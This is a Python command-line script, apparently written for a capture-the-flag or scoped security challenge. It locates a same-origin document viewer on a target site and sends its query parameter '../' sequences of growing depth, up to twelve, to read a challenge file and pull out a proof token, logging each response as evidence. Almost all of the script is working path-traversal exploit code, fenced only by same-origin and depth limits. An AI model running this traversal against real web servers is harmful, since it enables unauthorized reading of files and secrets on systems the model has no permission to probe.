#!/usr/bin/env python3
"""Read a challenge-provided proof through a same-origin document viewer."""

from __future__ import annotations

import argparse
from datetime import datetime, timezone
import hashlib
from html.parser import HTMLParser
import json
from pathlib import Path
import re
import sys
from urllib.parse import parse_qs, urlencode, urljoin, urlsplit, urlunsplit

from inspect_target import fetch, normalize_url, origin, safe_filename


PROOF_RE = re.compile(r"\bproof[_-][A-Za-z0-9_-]{12,}\b")
MAX_TRAVERSALS = 12


class LinkParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.links: list[str] = []

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        if tag == "a":
            href = dict(attrs).get("href")
            if href:
                self.links.append(href)


def decode_body(body: bytes, content_type: str) -> str:
    match = re.search(r"charset\s*=\s*['\"]?([^;'\"]+)", content_type, re.IGNORECASE)
    charset = match.group(1).strip() if match else "utf-8"
    try:
        return body.decode(charset, errors="replace")
    except LookupError:
        return body.decode("utf-8", errors="replace")


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Use a same-origin document parameter to test bounded path traversal."
    )
    parser.add_argument("target", help="absolute target URL assigned by the Game Master")
    parser.add_argument("--file", default="/run/huntress/objective.txt", help="challenge-provided file path")
    parser.add_argument("--parameter", default="doc", help="viewer query parameter (default: doc)")
    parser.add_argument("--output-dir", type=Path, help="directory for response evidence")
    parser.add_argument("--timeout", type=float, default=10.0)
    args = parser.parse_args()
    if args.timeout <= 0:
        parser.error("--timeout must be greater than zero")
    if not args.file.startswith("/") or ".." in args.file.split("/"):
        parser.error("--file must be an absolute in-scope path without traversal components")

    try:
        target = normalize_url(args.target)
        allowed_origin = origin(target)
    except ValueError as exc:
        parser.error(str(exc))
    host = urlsplit(target).hostname or "target"
    output_dir = args.output_dir or Path("web-tools/evidence") / f"{host}-traversal"
    output_dir.mkdir(parents=True, exist_ok=True)

    root = fetch(target, allowed_origin, args.timeout)
    root_body = root.pop("_body", b"")
    if root.get("status") != 200 or not isinstance(root_body, bytes):
        print(json.dumps({"error": "target root could not be read"}, indent=2))
        return 1

    root_url = str(root.get("final_url", target))
    links = LinkParser()
    links.feed(decode_body(root_body, str(root.get("headers", {}).get("content-type", ""))))
    viewer_url = root_url
    parameter = args.parameter
    viewer_found = parameter in parse_qs(urlsplit(root_url).query)
    for href in links.links:
        try:
            candidate = normalize_url(urljoin(root_url, href))
        except ValueError:
            continue
        if origin(candidate) == allowed_origin and parameter in parse_qs(urlsplit(candidate).query):
            viewer_url = candidate
            viewer_found = True
            break
    if not viewer_found:
        print(
            json.dumps(
                {
                    "error": f"no same-origin viewer link with parameter {parameter!r} was found",
                    "target": target,
                },
                indent=2,
            )
        )
        return 1

    parts = urlsplit(viewer_url)
    query = parse_qs(parts.query, keep_blank_values=True)
    query.pop(parameter, None)
    responses: list[dict[str, object]] = []
    proof: str | None = None
    proof_source: str | None = None
    attempts = 0
    for depth in range(1, MAX_TRAVERSALS + 1):
        attempts += 1
        relative_path = "../" * depth + args.file.lstrip("/")
        values = dict(query)
        values[parameter] = [relative_path]
        candidate = urlunsplit(
            (parts.scheme, parts.netloc, parts.path, urlencode(values, doseq=True), "")
        )
        response = fetch(candidate, allowed_origin, args.timeout)
        body = response.pop("_body", None)
        entry: dict[str, object] = {
            "depth": depth,
            "url": candidate,
            "status": response.get("status"),
        }
        if isinstance(body, bytes):
            body_path = output_dir / safe_filename(depth, candidate)
            body_path.write_bytes(body)
            text = decode_body(body, str(response.get("headers", {}).get("content-type", "")))
            matches = list(dict.fromkeys(PROOF_RE.findall(text)))
            entry.update(
                {"sha256": hashlib.sha256(body).hexdigest(), "body_file": body_path.name}
            )
            responses.append(entry)
            if matches:
                proof, proof_source = matches[0], candidate
                break
        else:
            responses.append(entry)

    report = {
        "target": target,
        "created_at": datetime.now(timezone.utc).isoformat(),
        "viewer_url": viewer_url,
        "file_path": args.file,
        "parameter": parameter,
        "request_policy": {
            "method": "GET",
            "same_origin_only": True,
            "maximum_traversal_depth": MAX_TRAVERSALS,
        },
        "responses": responses,
        "proof": proof,
        "proof_source": proof_source,
    }
    report_path = output_dir / "report.json"
    report_path.write_text(
        json.dumps(report, indent=2, ensure_ascii=False) + "\n", encoding="utf-8"
    )
    print(
        json.dumps(
            {
                "report": str(report_path),
                "attempts": attempts,
                "proof": proof,
                "proof_source": proof_source,
            },
            indent=2,
        )
    )
    return 0 if proof else 1


if __name__ == "__main__":
    sys.exit(main())
